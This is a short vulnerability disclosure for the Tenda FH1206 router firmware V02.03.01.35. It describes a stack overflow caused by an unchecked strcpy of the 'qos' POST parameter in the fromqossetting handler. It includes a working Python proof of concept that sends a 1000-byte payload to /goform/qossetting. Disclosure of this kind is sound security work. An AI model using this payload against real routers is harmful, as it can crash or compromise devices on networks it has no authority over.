## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

The Tenda FH1206 V02.03.01.35 has a stack overflow vulnerability located in the `fromqossetting` function. This function accepts the `qos` parameter from a POST request. The statement `strcpy(v8, src);` leads to a buffer overflow. The user-supplied `qos` can exceed the capacity of the `v8` array, thus triggering this security vulnerability.

![image](https://github.com/user-attachments/assets/a51662f9-763f-47ff-8978-d8e88fc4f430)


## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/qossetting"
payload = b"a"*1000

data = {"qos": payload, "op":"delete"}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801202321673.png)
